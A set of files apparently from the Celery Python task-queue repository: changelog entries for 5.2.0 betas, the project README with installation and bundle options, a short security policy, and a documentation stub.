5.2.0b2 {#version-5.2.0b2}
-------

release-date

:   2021-08-17 5.35 P.M UTC+3:00

release-by

:   Omer Katz

-   Test windows on py3.10rc1 and pypy3.7 (\#6868).
-   Route chord\_unlock task to the same queue as chord body (\#6896).
-   Add message properties to app.tasks.Context (\#6818).
-   handle already converted LogLevel and JSON (\#6915).
-   5.2 is codenamed dawn-chorus.
-   Bump version: 5.2.0b1 → 5.2.0b2.

5.2.0b1 {#version-5.2.0b1}
-------

release-date

:   2021-08-11 5.42 P.M UTC+3:00

release-by

:   Omer Katz

-   Add Python 3.10 support (\#6807).
-   Fix docstring for Signal.send to match code (\#6835).
-   No blank line in log output (\#6838).
-   Chords get body\_type independently to handle cases where body.type does not exist (\#6847).
-   Fix \#6844 by allowing safe queries via app.inspect().active() (\#6849).
-   Fix multithreaded backend usage (\#6851).
-   Fix Open Collective donate button (\#6848).
-   Fix setting worker concurrency option after signal (\#6853).
-   Make ResultSet.on\_ready promise hold a weakref to self (\#6784).
-   Update configuration.rst.
-   Discard jobs on flush if synack isn\'t enabled (\#6863).
-   Bump click version to 8.0 (\#6861).
-   Amend IRC network link to Libera (\#6837).
-   Import celery lazily in pytest plugin and unignore flake8 F821, \"undefined name \'\...\'\" (\#6872).
-   Fix inspect \--json output to return valid json without \--quiet.
-   Remove celery.task references in modules, docs (\#6869).
-   The Consul backend must correctly associate requests and responses (\#6823).


---

README.rst

---

![image](https://docs.celeryq.dev/en/latest/_images/celery-banner-small.png)

[![Build status](https://github.com/celery/celery/actions/workflows/python-package.yml/badge.svg)](https://github.com/celery/celery/actions/workflows/python-package.yml) [![coverage](https://codecov.io/github/celery/celery/coverage.svg?branch=main)](https://codecov.io/github/celery/celery?branch=main) [![BSD License](https://img.shields.io/pypi/l/celery.svg)](https://opensource.org/licenses/BSD-3-Clause) [![Celery can be installed via wheel](https://img.shields.io/pypi/wheel/celery.svg)](https://pypi.org/project/celery/) [![Semgrep security](https://img.shields.io/badge/semgrep-security-green.svg)](https://go.semgrep.dev/home) [![Supported Python versions.](https://img.shields.io/pypi/pyversions/celery.svg)](https://pypi.org/project/celery/) [![Supported Python implementations.](https://img.shields.io/pypi/implementation/celery.svg)](https://pypi.org/project/celery/) [![Backers on Open Collective](https://opencollective.com/celery/backers/badge.svg)](#backers) [![Sponsors on Open Collective](https://opencollective.com/celery/sponsors/badge.svg)](#sponsors)

Version

:   5.5.0rc1 (immunity)

Web

:   <https://docs.celeryq.dev/en/stable/index.html>

Download

:   <https://pypi.org/project/celery/>

Source

:   <https://github.com/celery/celery/>

Keywords

:   task, queue, job, async, rabbitmq, amqp, redis, python, distributed, actors

Donations
=========

This project relies on your generous donations.

If you are using Celery to create a commercial product, please consider becoming our [backer](https://opencollective.com/celery#backer) or our [sponsor](#sponsor) to ensure Celery\'s future.

For enterprise
==============

Available as part of the Tidelift Subscription.

The maintainers of `celery` and thousands of other packages are working with Tidelift to deliver commercial support and maintenance for the open source dependencies you use to build your applications. Save time, reduce risk, and improve code health, while paying the maintainers of the exact dependencies you use. [Learn more.](https://tidelift.com/subscription/pkg/pypi-celery?utm_source=pypi-celery&utm_medium=referral&utm_campaign=enterprise&utm_term=repo)

Sponsor
=======

[Dragonfly](https://www.dragonflydb.io/) is a drop-in Redis replacement that cuts costs and boosts performance. Designed to fully utilize the power of modern cloud hardware and deliver on the data demands of modern applications, Dragonfly frees developers from the limits of traditional in-memory data stores.

![Dragonfly logo](https://github.com/celery/celery/raw/main/docs/images/dragonfly.svg){width="150px"}

What\'s a Task Queue?
=====================

Task queues are used as a mechanism to distribute work across threads or machines.

A task queue\'s input is a unit of work, called a task, dedicated worker processes then constantly monitor the queue for new work to perform.

Celery communicates via messages, usually using a broker to mediate between clients and workers. To initiate a task a client puts a message on the queue, the broker then delivers the message to a worker.

A Celery system can consist of multiple workers and brokers, giving way to high availability and horizontal scaling.

Celery is written in Python, but the protocol can be implemented in any language. In addition to Python there\'s [node-celery](https://github.com/mher/node-celery) for Node.js, a [PHP client](https://github.com/gjedeer/celery-php), [gocelery](https://github.com/gocelery/gocelery), [gopher-celery](https://github.com/marselester/gopher-celery) for Go, and [rusty-celery](https://github.com/rusty-celery/rusty-celery) for Rust.

Language interoperability can also be achieved by using webhooks in such a way that the client enqueues an URL to be requested by a worker.

What do I need?
===============

Celery version 5.5.x runs on:

-   Python (3.8, 3.9, 3.10, 3.11, 3.12, 3.13)
-   PyPy3.9+ (v7.3.12+)

This is the version of celery which will support Python 3.8 or newer.

If you\'re running an older version of Python, you need to be running an older version of Celery:

-   Python 3.7: Celery 5.2 or earlier.
-   Python 3.6: Celery 5.1 or earlier.
-   Python 2.7: Celery 4.x series.
-   Python 2.6: Celery series 3.1 or earlier.
-   Python 2.5: Celery series 3.0 or earlier.
-   Python 2.4: Celery series 2.2 or earlier.

Celery is a project with minimal funding, so we don\'t support Microsoft Windows but it should be working. Please don\'t open any issues related to that platform.

*Celery* is usually used with a message broker to send and receive messages. The RabbitMQ, Redis transports are feature complete, but there\'s also experimental support for a myriad of other solutions, including using SQLite for local development.

*Celery* can run on a single machine, on multiple machines, or even across datacenters.

Get Started
===========

If this is the first time you\'re trying to use Celery, or you\'re new to Celery v5.5.x coming from previous versions then you should read our getting started tutorials:

-   [First steps with Celery](https://docs.celeryq.dev/en/stable/getting-started/first-steps-with-celery.html)

    > Tutorial teaching you the bare minimum needed to get started with Celery.

-   [Next steps](https://docs.celeryq.dev/en/stable/getting-started/next-steps.html)

    > A more complete overview, showing more features.

> You can also get started with Celery by using a hosted broker transport CloudAMQP. The largest hosting provider of RabbitMQ is a proud sponsor of Celery.

Celery is\...
=============

-   **Simple**

    > Celery is easy to use and maintain, and does *not need configuration files*.
    >
    > It has an active, friendly community you can talk to for support, like at our [mailing-list](#mailing-list), or the IRC channel.
    >
    > Here\'s one of the simplest applications you can make:
    >
    > ``` {.python}
    > from celery import Celery
    >
    > app = Celery('hello', broker='amqp://guest@localhost//')
    >
    > @app.task
    > def hello():
    >     return 'hello world'
    > ```

-   **Highly Available**

    > Workers and clients will automatically retry in the event of connection loss or failure, and some brokers support HA in way of *Primary/Primary* or *Primary/Replica* replication.

-   **Fast**

    > A single Celery process can process millions of tasks a minute, with sub-millisecond round-trip latency (using RabbitMQ, py-librabbitmq, and optimized settings).

-   **Flexible**

    > Almost every part of *Celery* can be extended or used on its own, Custom pool implementations, serializers, compression schemes, logging, schedulers, consumers, producers, broker transports, and much more.

It supports\...
===============

> -   **Message Transports**
>
>     > -   [RabbitMQ](https://rabbitmq.com), [Redis](https://redis.io), Amazon SQS, Google Pub/Sub
>
> -   **Concurrency**
>
>     > -   Prefork, [Eventlet](http://eventlet.net/), [gevent](http://gevent.org/), single threaded (`solo`)
>
> -   **Result Stores**
>
>     > -   AMQP, Redis
>     > -   memcached
>     > -   SQLAlchemy, Django ORM
>     > -   Apache Cassandra, IronCache, Elasticsearch
>     > -   Google Cloud Storage
>
> -   **Serialization**
>
>     > -   *pickle*, *json*, *yaml*, *msgpack*.
>     > -   *zlib*, *bzip2* compression.
>     > -   Cryptographic message signing.

Framework Integration
=====================

Celery is easy to integrate with web frameworks, some of which even have integration packages:

>   ----------------------------------------------------------------------- -------------------------------------------------------------
>   [Django](https://djangoproject.com/)                                    not needed
>
>   [Pyramid](https://docs.pylonsproject.org/projects/pyramid/en/latest/)   [pyramid\_celery](https://pypi.org/project/pyramid_celery/)
>
>   [Pylons](http://pylonsproject.org/)                                     [celery-pylons](https://pypi.org/project/celery-pylons/)
>
>   [Flask](https://flask.palletsprojects.com/)                             not needed
>
>   [web2py](http://web2py.com/)                                            [web2py-celery](https://code.google.com/p/web2py-celery/)
>
>   [Tornado](https://www.tornadoweb.org/)                                  [tornado-celery](https://github.com/mher/tornado-celery/)
>
>   [FastAPI](https://fastapi.tiangolo.com/)                                not needed
>   ----------------------------------------------------------------------- -------------------------------------------------------------

The integration packages aren\'t strictly necessary, but they can make development easier, and sometimes they add important hooks like closing database connections at `fork`.

Documentation {#celery-documentation}
=============

The [latest documentation](https://docs.celeryq.dev/en/latest/) is hosted at Read The Docs, containing user guides, tutorials, and an API reference.

Installation {#celery-installation}
============

You can install Celery either via the Python Package Index (PyPI) or from source.

To install using `pip`:

:

    $ pip install -U Celery

Bundles
-------

Celery also defines a group of bundles that can be used to install Celery and the dependencies for a given feature.

You can specify these in your requirements or on the `pip` command-line by using brackets. Multiple bundles can be specified by separating them by commas.

:

    $ pip install "celery[redis]"

    $ pip install "celery[redis,auth,msgpack]"

The following bundles are available:

### Serializers

`celery[auth]`

:   for using the `auth` security serializer.

`celery[msgpack]`

:   for using the msgpack serializer.

`celery[yaml]`

:   for using the yaml serializer.

### Concurrency

`celery[eventlet]`

:   for using the `eventlet` pool.

`celery[gevent]`

:   for using the `gevent` pool.

### Transports and Backends

`celery[amqp]`

:   for using the RabbitMQ amqp python library.

`celery[redis]`

:   for using Redis as a message transport or as a result backend.

`celery[sqs]`

:   for using Amazon SQS as a message transport.

`celery[tblib`\]

:   for using the `task_remote_tracebacks` feature.

`celery[memcache]`

:   for using Memcached as a result backend (using `pylibmc`)

`celery[pymemcache]`

:   for using Memcached as a result backend (pure-Python implementation).

`celery[cassandra]`

:   for using Apache Cassandra/Astra DB as a result backend with the DataStax driver.

`celery[azureblockblob]`

:   for using Azure Storage as a result backend (using `azure-storage`)

`celery[s3]`

:   for using S3 Storage as a result backend.

`celery[gcs]`

:   for using Google Cloud Storage as a result backend.

`celery[couchbase]`

:   for using Couchbase as a result backend.

`celery[arangodb]`

:   for using ArangoDB as a result backend.

`celery[elasticsearch]`

:   for using Elasticsearch as a result backend.

`celery[riak]`

:   for using Riak as a result backend.

`celery[cosmosdbsql]`

:   for using Azure Cosmos DB as a result backend (using `pydocumentdb`)

`celery[zookeeper]`

:   for using Zookeeper as a message transport.

`celery[sqlalchemy]`

:   for using SQLAlchemy as a result backend (*supported*).

`celery[pyro]`

:   for using the Pyro4 message transport (*experimental*).

`celery[slmq]`

:   for using the SoftLayer Message Queue transport (*experimental*).

`celery[consul]`

:   for using the Consul.io Key/Value store as a message transport or result backend (*experimental*).

`celery[django]`

:   specifies the lowest version possible for Django support.

    You should probably not use this in your requirements, it\'s here for informational purposes only.

`celery[gcpubsub]`

:   for using Google Pub/Sub as a message transport.

Downloading and installing from source {#celery-installing-from-source}
--------------------------------------

Download the latest version of Celery from PyPI:

<https://pypi.org/project/celery/>

You can install it by doing the following:

:

    $ tar xvfz celery-0.0.0.tar.gz
    $ cd celery-0.0.0
    $ python setup.py build
    # python setup.py install

The last command must be executed as a privileged user if you aren\'t currently using a virtualenv.

Using the development version {#celery-installing-from-git}
-----------------------------

### With pip

The Celery development version also requires the development versions of `kombu`, `amqp`, `billiard`, and `vine`.

You can install the latest snapshot of these using the following pip commands:

:

    $ pip install https://github.com/celery/celery/zipball/main#egg=celery
    $ pip install https://github.com/celery/billiard/zipball/main#egg=billiard
    $ pip install https://github.com/celery/py-amqp/zipball/main#egg=amqp
    $ pip install https://github.com/celery/kombu/zipball/main#egg=kombu
    $ pip install https://github.com/celery/vine/zipball/main#egg=vine

### With git

Please see the Contributing section.

Getting Help
============

Mailing list
------------

For discussions about the usage, development, and future of Celery, please join the [celery-users](https://groups.google.com/group/celery-users/) mailing list.

IRC {#irc-channel}
---

Come chat with us on IRC. The **\#celery** channel is located at the [Libera Chat](https://libera.chat/) network.

Bug tracker
===========

If you have any suggestions, bug reports, or annoyances please report them to our issue tracker at <https://github.com/celery/celery/issues/>

Wiki
====

<https://github.com/celery/celery/wiki>

Credits
=======

Contributors {#contributing-short}
------------

This project exists thanks to all the people who contribute. Development of [celery]{.title-ref} happens at GitHub: <https://github.com/celery/celery>

You\'re highly encouraged to participate in the development of [celery]{.title-ref}. If you don\'t like GitHub (for some reason) you\'re welcome to send regular patches.

Be sure to also read the [Contributing to Celery](https://docs.celeryq.dev/en/stable/contributing.html) section in the documentation.

[![oc-contributors](https://opencollective.com/celery/contributors.svg?width=890&button=false)](https://github.com/celery/celery/graphs/contributors)

Backers
-------

Thank you to all our backers! 🙏 \[[Become a backer](https://opencollective.com/celery#backer)\]

[![oc-backers](https://opencollective.com/celery/backers.svg?width=890)](https://opencollective.com/celery#backers)

Sponsors
--------

Support this project by becoming a sponsor. Your logo will show up here with a link to your website. \[[Become a sponsor](https://opencollective.com/celery#sponsor)\]

[![oc-sponsor-1](https://opencollective.com/celery/sponsor/0/avatar.svg)](https://opencollective.com/celery/sponsor/0/website) [![Blacksmith.sh](./docs/images/blacksmith-logo-white-on-black.svg){width="240px" height="57px"}](https://www.blacksmith.sh/) [![Upstash](https://upstash.com/logo/upstash-dark-bg.svg){width="200px" height="57px"}](http://upstash.com/?code=celery)

License
=======

This software is licensed under the [New BSD License]{.title-ref}. See the `LICENSE` file in the top distribution directory for the full license text.


---

SECURITY.md

---

# Security Policy

## Supported Versions

Use this section to tell people about which versions of your project are
currently being supported with security updates.

| Version | Supported          |
| ------- | ------------------ |
| 5.3.x   | :white_check_mark: |
| 5.2.x   | :x:                |
| 5.1.x   | :x: |
| < 5.0   | :x:                |

## Reporting a Vulnerability

Please reach out to auvipy@gmail.com & omer.drow@gmail.com for reporting security concerns via email.


---

contents.md

---

# Documentation

<div class="toctree" data-maxdepth="2">

</div>

<div class="automodule" data-members="">

foo

</div>